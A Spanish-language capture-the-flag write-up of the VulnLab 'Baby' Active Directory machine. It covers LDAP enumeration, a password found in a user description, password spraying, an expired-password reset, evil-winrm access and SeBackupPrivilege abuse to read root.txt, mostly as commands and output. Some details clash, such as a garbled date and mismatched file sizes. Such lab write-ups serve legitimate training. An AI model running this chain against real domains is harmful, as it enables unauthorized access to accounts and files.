---
title: 'VulnLab: Baby'
description: 'Writeup de la máquina vulnerable Baby de VulnLab — enumeración LDAP, credenciales embebidas y escalada con SeBackupPrivilege'
pubDate: 'Feb 5 2026'
heroImage: '../../assets/blog-placeholder-3.jpg'
author: 'Xavier Magallanes'
tags: ['vulnlab', 'writeup', 'ctf', 'active-directory', 'windows']
category: 'writeup'
---

El día de hoy vamos a realizar el writeup de la máquina vulnerable Baby de VulnLab. Esta máquina está diseñada para principiantes y nos ayudará a entender conceptos básicos de explotación y escalada de privilegios en entornos Active Directory.

## Reconocimiento

Comenzamos con un escaneo de puertos utilizando Nmap para identificar los servicios que están corriendo en la máquina objetivo.

```bash
sudo nmap -sS -Pn -n -p- --open -T5 --min-rate 5000 10.10.65.235 -vvv

PORT      STATE SERVICE       REASON
53/tcp    open  domain        syn-ack ttl 127
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
464/tcp   open  kpasswd5      syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
5985/tcp  open  wsman         syn-ack ttl 127
49664/tcp open  unknown       syn-ack ttl 127
```

Al ver los puertos abiertos, notamos que hay varios servicios de Windows corriendo, incluyendo SMB (puertos 139 y 445) y WinRM (puerto 5985).

## Enumeración SMB

Vamos a enumerar el servicio SMB utilizando `netexec` con una sesión anónima.

```bash
nxc smb 10.10.65.235 -u '' -p ''
SMB         10.10.65.235    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.10.65.235    445    BABYDC           [+] baby.vl\: 
```

Al ver que teníamos la capacidad de autenticarnos de manera anónima, procedemos a listar recursos y generar el archivo hosts.

```bash
nxc smb 10.10.65.235 -u '' -p '' --shares
SMB         10.10.65.235    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.10.65.235    445    BABYDC           [+] baby.vl\:
SMB         10.10.65.235    445    BABYDC           [-] Error enumerating shares: STATUS_ACCESS_DENIED

nxc smb 10.10.65.235 -u '' -p '' --generate-hosts hosts.txt
SMB         10.10.65.235    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.10.65.235    445    BABYDC           [+] baby.vl\:

cat hosts.txt
10.10.65.235     BABYDC.baby.vl baby.vl BABYDC
```

Agregamos la entrada al archivo `/etc/hosts` para facilitar futuras conexiones.

A continuación enumeramos usuarios por LDAP ya que por SMB de manera anónima no pudimos obtener mucha información.

```bash
nxc ldap 10.10.65.235 -u '' -p '' --users-export output.txt
LDAP        10.10.65.235    389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.10.65.235    389    BABYDC           [+] baby.vl\:
LDAP        10.10.65.235    389    BABYDC           [*] Enumerated 9 domain users: baby.vl
LDAP        10.10.65.235    389    BABYDC           -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        10.10.65.235    389    BABYDC           Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        10.10.65.235    389    BABYDC           Jacqueline.Barnett            2021-11-21 10:11:03 0
LDAP        10.10.65.235    389    BABYDC           Ashley.Webb                   2021-11-21 10:11:03 0
LDAP        10.10.65.235    389    BABYDC           Hugh.George                   2021-11-21 10:11:03 0
LDAP        10.10.65.235    389    BABYDC           Leonard.Dyer                  2021-11-21 10:11:03 0
LDAP        10.10.65.235    389    BABYDC           Connor.Wilkinson              2021-11-21 10:11:08 0
LDAP        10.10.65.235    389    BABYDC           Joseph.Hughes                 2021-11-21 10:11:08 0
LDAP        10.10.65.235    389    BABYDC           Kerry.Wilson                  2021-11-21 10:11:08 0
LDAP        10.10.65.235    389    BABYDC           Teresa.Bell                   2021-11-21 10:14:37 0        Set initial password to BabyStart123!
LDAP        10.10.65.235    389    BABYDC           [*] Writing 9 local users to output.txt
```

Revisamos el archivo `output.txt` y encontramos varios usuarios. Notamos que el usuario `Teresa.Bell` tiene una descripción que indica su contraseña inicial: `BabyStart123!`.

## Acceso Inicial

Hacemos un password spray usando SMB y la credencial que encontramos para el usuario `Teresa.Bell`.

```bash
nxc smb 10.10.65.235 -u output.txt -p 'BabyStart123!'
SMB         10.10.65.235    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.10.65.235    445    BABYDC           [-] baby.vl\Guest:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.10.65.235    445    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.10.65.235    445    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.10.65.235    445    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.10.65.235    445    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.10.65.235    445    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.10.65.235    445    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.10.65.235    445    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.10.65.235    445    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE
```

Vemos que la contraseña no funciona, pero recordamos el mensaje que nos dio el servicio LDAP, así que procedemos a ver de manera manual usando `ldapsearch` si encontramos más usuarios con la misma contraseña.

```bash
ldapsearch -x -b "dc=baby,dc=vl" "user" -H ldap://10.10.65.235
...
# Caroline Robinson, it, baby.vl
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```

Al final encontramos el usuario `Caroline.Robinson` en el departamento de IT. Probamos la misma contraseña con este usuario y vemos que retorna el estado `Password_Must_Change`.

```bash
nxc smb 10.10.65.235 -u 'Caroline.Robinson' -p 'BabyStart123!'
SMB         10.10.65.235    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.10.65.235    445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

Procedemos a cambiar la contraseña utilizando `smbpasswd`.

```bash
smbpasswd -r 10.10.65.235 -U Caroline.Robinson
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user Caroline.Robinson
```

Después de unos errores debido a la política de contraseñas, logramos cambiar la contraseña a `RootMaker123!` y para verificar usamos netexec para enumerar la política de contraseñas.

```bash
nxc smb 10.10.65.235 -u 'Caroline.Robinson' -p 'RootMaker123!' --pass-pol
SMB         10.10.65.235    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.10.65.235    445    BABYDC           [+] baby.vl\Caroline.Robinson:RootMaker123!
SMB         10.10.65.235    445    BABYDC           [+] Dumping password info for domain: BABY
SMB         10.10.65.235    445    BABYDC           Minimum password length: 7
SMB         10.10.65.235    445    BABYDC           Password history length: 24
SMB         10.10.65.235    445    BABYDC           Maximum password age: 41 days 23 hours 53 minutes
SMB         10.10.65.235    445    BABYDC           
SMB         10.10.65.235    445    BABYDC           Password Complexity Flags: 000001
SMB         10.10.65.235    445    BABYDC               Domain Refuse Password Change: 0
SMB         10.10.65.235    445    BABYDC               Domain Password Store Cleartext: 0
SMB         10.10.65.235    445    BABYDC               Domain Password Lockout Admins: 0
SMB         10.10.65.235    445    BABYDC               Domain Password No Clear Change: 0
SMB         10.10.65.235    445    BABYDC               Domain Password No Anon Change: 0
SMB         10.10.65.235    445    BABYDC               Domain Password Complex: 1
SMB         10.10.65.235    445    BABYDC           
SMB         10.10.65.235    445    BABYDC           Minimum password age: 1 day 4 minutes
SMB         10.10.65.235    445    BABYDC           Reset Account Lockout Counter: 30 minutes
SMB         10.10.65.235    445    BABYDC           Locked Account Duration: 30 minutes
SMB         10.10.65.235    445    BABYDC           Account Lockout Threshold: None
SMB         10.10.65.235    445    BABYDC           Forced Log off Time: Not Set
```

Ahora probamos a conectarnos por WinRM utilizando las credenciales de `Caroline.Robinson` y la nueva contraseña.

```bash
evil-winrm -i 10.10.65.235 -u 'Caroline.Robinson' -p 'RootMaker123!'

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami
baby\caroline.robinson
```

Y encontramos la flag de `user.txt`.

## Escalada de Privilegios

Para la escalada de privilegios, enumeramos los privilegios del usuario actual con `whoami /priv` y notamos el privilegio `SeBackupPrivilege`.

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Con este privilegio realizamos una explotación manual. Al poder realizar backups, podemos extraer el archivo `root.txt` que contiene la flag de root. Subimos los siguientes módulos a `C:\Temp`:

```powershell
*Evil-WinRM* PS C:\Temp> upload /home/kali/Labs/Vulnlab/Baby_easy/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll

Info: Uploading .../SeBackupPrivilegeCmdLets.dll to C:\Temp\SeBackupPrivilegeCmdLets.dll
Data: 16384 bytes of 16384 bytes copied
Info: Upload successful!

*Evil-WinRM* PS C:\Temp> upload /home/kali/Labs/Vulnlab/Baby_easy/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll

Info: Uploading .../SeBackupPrivilegeUtils.dll to C:\Temp\SeBackupPrivilegeUtils.dll
Data: 21844 bytes of 21844 bytes copied
Info: Upload successful!

*Evil-WinRM* PS C:\Temp> Import-Module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Temp> Import-Module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Temp> Set-SeBackupPrivilege
*Evil-WinRM* PS C:\Temp> Get-SeBackupPrivilege
```

Con los módulos importados usamos `Copy-FileSeBackupPrivilege` para copiar el archivo `root.txt` a nuestra carpeta temporal.

```powershell
*Evil-WinRM* PS C:\Temp> Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt C:\Temp\root.txt -Overwrite
*Evil-WinRM* PS C:\Temp> dir

    Directory: C:\Temp

Mode                 LastWriteTime         Length Name
----                 --------------         ------ ----
-a----          2/5/2026   6:44 PM             36 root.txt
-a----          2/5/65.2026   6:14 PM          49152 sam.hive
-a----          2/5/2026   6:42 PM          12288 SeBackupPrivilegeCmdLets.dll
-a----          2/5/2026   6:42 PM          16384 SeBackupPrivilegeUtils.dll
-a----          2/5/2026   6:14 PM       16859136 system.hive
```

Y con esto obtenemos la flag de root, completando la máquina.

## Conclusiones

Baby es una máquina excelente para quienes se inician en entornos Active Directory. Los puntos clave a recordar:

- **Siempre revisar la descripción de los usuarios en LDAP** — puede contener credenciales
- **El estado `STATUS_PASSWORD_MUST_CHANGE`** indica que podemos cambiar la contraseña sin conocer la actual
- **`SeBackupPrivilege`** permite leer archivos incluso sin permisos explícitos, una técnica fundamental en AD